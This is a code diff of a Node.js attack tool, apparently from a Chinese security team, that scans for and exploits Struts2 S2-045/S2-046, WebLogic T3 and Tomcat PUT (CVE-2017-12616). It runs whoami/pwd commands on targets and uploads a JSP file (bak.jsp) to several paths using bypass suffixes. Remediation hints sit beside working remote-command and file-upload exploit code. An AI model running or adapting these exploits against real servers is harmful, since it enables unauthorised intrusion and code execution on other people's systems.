@@ -13,11 +13,17 @@ var szMyName = 'M.T.X._2017-06-08 1.0',
 	g_nPool = 100,
 	iconv = require("iconv-lite"),
 	bRunHost = false,
-	g_szUa = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	
+	g_szUa = "Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540",
 	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
 	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
 	aHS = "X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/)
 		;
+
+// for(var k in global)console.log(k + " = " + global[k])
+// 加载所有的插件动态库
+// 各种插件库分开编写，便于维护
+// eval(fs.readFileSync(a[k])+'');
 process.title = '巅狼团队_M.T.X.V 2.0'
 process.stdin.setEncoding('utf8');
 process.env.NODE_ENV = "production";
@@ -168,18 +174,20 @@ function fnSocket(h,p,szSend,fnCbk)
 function checkWeblogicT3(h,p)
 {
 	var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
-	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
+	var s = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n";
+	// var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
 	p || (p = nPort);
 	fnLog(s);
 	fnSocket(h,p,s,function(data)
 	{
-		if(data)
+		data=(data||"").toString().trim();
+		if(data && -1 == data.indexOf("Bad Request") && -1 < data.indexOf("10.3."))
 		{
-			g_oRst.t3 = {r:data.toString().trim(),des:"建议关闭T3协议，或者限定特定ip可访问"};
+			g_oRst.t3 = {r:data,des:"建议关闭T3协议，或者限定特定ip可访问"};
 			fnLog(g_oRst.t3.r);
 			console.log("found T3 " + h + ":" + p);
 		}
-		else console.log("not found T3 " + h + ":" + p);
+		// else console.log("not found T3 " + h + ":" + p + " " + data);
 		/*
 		var d = data && data.toString().trim() || "", 
 			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
@@ -395,7 +403,8 @@ function getIps(ip)
 	});
 
 }
-
+for(var k in this)
+console.log(k + " = " + this[k])
 // /usr/local/apache-tomcat-7.0.64-2/webapps
 // http://192.168.10.216:8082/s2-046/
 function doStruts2_046(url)
@@ -668,7 +677,7 @@ function doStruts2_045(url, fnCbk)
 	  		{
 	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
 	  			// console.log(body);
-	  			fnDoBody(body,"s2-045",url);
+	  			fnDoBody(body,"s2-045 CVE-2017-5638",url);
 	  		}
 	    }
 	  );
@@ -1505,7 +1514,7 @@ function testWeblogic(url,fnCbk)
 	{
 		if(b && 200 == r.statusCode && -1 < b.indexOf("weblogic.uddi.client"))
 		{
-			g_oRst.weblogic = {uddiexplorer:"发现uddiexplorer可访问，且存在SSRF漏洞"};
+			g_oRst.weblogic = {uddiexplorer:"发现uddiexplorer可访问，且存在SSRF漏洞，建议将/uddiexplorer加入访问黑名单中"};
 		}
 
 	});
@@ -1513,14 +1522,14 @@ function testWeblogic(url,fnCbk)
 	{
 		if(r && 200 == r.statusCode)
 		{
-			g_oRst.weblogic = {console:"发现console可访问，不符合安全规范要求，建议关闭、设置访问限制"};
+			g_oRst.weblogic = {console:"发现console可访问，不符合安全规范要求，建议关闭、设置访问限制，建议将/console 加入访问黑名单中"};
 		}
 	});
 	request(fnOptHeader({method:"GET",uri:szCs2}),function(e,r,b)
 	{
 		if(r && 200 == r.statusCode && -1 < String(b).indexOf("manager"))
 		{
-			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制"};
+			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制，建议将/manager加入访问黑名单中"};
 		}
 	});
 }
@@ -1616,25 +1625,33 @@ http://127.0.0.1:8080/123.jsp
 var szCode = fs.readFileSync(__dirname + "/bak.jsp").toString();
 function fnMyPut(url)
 {
-	url = url.substr(0, url.lastIndexOf('/') + 1);
-	var a = ["bak.jsp%20","bak.jsp/","bak.jsp%00","bak.jsp"];
-	var fnPt = function(u)
+	var szOld = url.substr(0, url.indexOf("/",10));
+	var aUrls = [url.substr(0, url.lastIndexOf('/') + 1),szOld,szOld + "/examples/",szOld + "/manager/"];
+	var fnTmpFc = function(url)
 	{
-		request.put({"uri":u,"body":szCode},function(e,r,b)
+		var a = ["bak.jsp%20","bak.jsp/","bak.jsp%00","bak.jsp"];
+		var fnPt = function(u)
 		{
-			if(e);//console.log(e);
-			// console.log([u,r.statusCode,r.headers["location"],e||b]);
-			else if(r && (201 == r.statusCode || 204 == r.statusCode))
+			request.put({"uri":u,"body":szCode},function(e,r,b)
 			{
-				var oT = g_oRst["tomcat"] || {};
-				oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
-				console.log(oT["CVE-2017-12616"]);
-				g_oRst["tomcat"] = oT;
-			}
-		});
+				if(e);//console.log(e);
+				// console.log([u,r.statusCode,r.headers["location"],e||b]);
+				else if(r && (201 == r.statusCode || 204 == r.statusCode))
+				{
+					var oT = g_oRst["tomcat"] || {};
+					oT["CVE-2017-12616"] = "发现高危put CVE-2017-12616漏洞,可访" + u + "问进行测试";
+					console.log(oT["CVE-2017-12616"]);
+					g_oRst["tomcat"] = oT;
+				}
+			});
+		};
+		for(var k in a)
+			fnPt(url + a[k]);	
 	};
-	for(var k in a)
-		fnPt(url + a[k]);	
+	for(var k in aUrls)
+	{
+		fnTmpFc(aUrls[k]);
+	}
 }
 
 // https://github.com/Medicean/VulApps/tree/master/s/struts2
